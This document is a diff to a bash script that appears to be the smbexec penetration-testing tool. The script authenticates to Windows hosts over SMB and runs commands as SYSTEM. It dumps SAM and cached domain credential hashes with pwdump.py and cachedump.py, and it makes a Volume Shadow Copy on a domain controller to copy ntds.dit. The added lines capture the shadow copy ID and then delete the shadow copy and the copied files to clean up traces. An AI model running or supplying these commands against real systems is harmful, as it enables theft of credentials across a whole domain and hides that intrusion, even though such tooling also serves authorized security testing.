@@ -331,7 +331,7 @@ fi
 	f_smbauthinfo
 
 	if [ -s /tmp/smbexec/success.chk ] && [ -z "$badshare" ]; then
-		echo -e "\n\e[1;32m[+] Authentication to $i successful...\e[0m"
+		echo -e "\n\e[1;32m[+] Authentication to $i successful...\e[0m\n"
 	elif [ -s /tmp/smbexec/success.chk ] && [ ! -z "$badshare" ]; then
 		echo -e "\n\e[1;33m[*] Authentication to $i was successful, but the share doesn't exist\e[0m"
 	elif [ ! -z "$logonfail" ]; then
@@ -364,10 +364,10 @@ fi
 		if [ -e $logfldr/hashes/$i/sam ] && [ -e $logfldr/hashes/$i/sec ] && [ -e $logfldr/hashes/$i/sys ]; then
 			$creddumpath/pwdump.py $logfldr/hashes/$i/sys $logfldr/hashes/$i/sam > $logfldr/hashes/$i/localhashes.lst
 			$creddumpath/cachedump.py $logfldr/hashes/$i/sys $logfldr/hashes/$i/sec > $logfldr/hashes/$i/dcchashes.lst
-			echo -en "\n\e[1;32m[+] Hashes from $i have been dumped...\e[0m"
+			echo -en "\t\e[1;32m[+] Hashes from $i have been dumped...\e[0m\n"
 			sleep 2
 		    else
-			echo -en "\n\e[1;31m[!] Something happened and I couldn't get the registry keys from $i...\e[0m"
+			echo -en "\t\e[1;31m[!] Something happened and I couldn't get the registry keys from $i...\e[0m\n"
 			sleep 2
 		fi
 	fi
@@ -491,6 +491,7 @@ for i in $(cat $RHOSTS); do
 	echo -e "\n\e[1;33mAttempting to create a Volume Shadow Copy for the Domain Controller specified...\e[0m"
 	$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C vssadmin create shadow /for=$ntdsdrive" &> /tmp/smbexec/vssdc.out
 	vscpath=$(cat /tmp/smbexec/vssdc.out | grep "Volume Name"|cut -d " " -f9)
+	vscid=\{$(cat /tmp/smbexec/vssdc.out |grep "Shadow Copy ID"|cut -d "{" -f2|cut -d "}" -f1)\}
 	if [ -z "$vscpath" ]; then
 		echo -e "\t\e[1;31m[!] Could not create a Volume Shadow Copy...\e[0m"
 		cat /tmp/smbexec/vssdc.out
@@ -520,9 +521,9 @@ for i in $(cat $RHOSTS); do
 	fi
 	#cleanup the host
 	echo -e "\n\e[1;33mAttempting to remove the files created from the Domain Controller...\e[0m"
-	$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C DEL $tempdrive$temppath\sys && DEL $tempdrive$temppath\ntds.dit" &> /dev/null
-	#echo -e "\n\e[1;33mAttempting to remove the shadow copy created from the Domain Controller...\e[0m"
-	#$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C DEL $tempdrive$temppath\sys && DEL $tempdrive$temppath\ntds.dit" &> /dev/null
+	$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C DEL $tempdrive$temppath\sys && DEL $tempdrive$temppath\ntds.dit" &> /dev/null
+	echo -e "\n\e[1;33mAttempting to remove the shadow copy created from the Domain Controller...\e[0m"
+	$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C vssadmin Delete Shadows /Shadow=$vscid /quiet" &> /dev/null
 done
 
 f_esedbexport
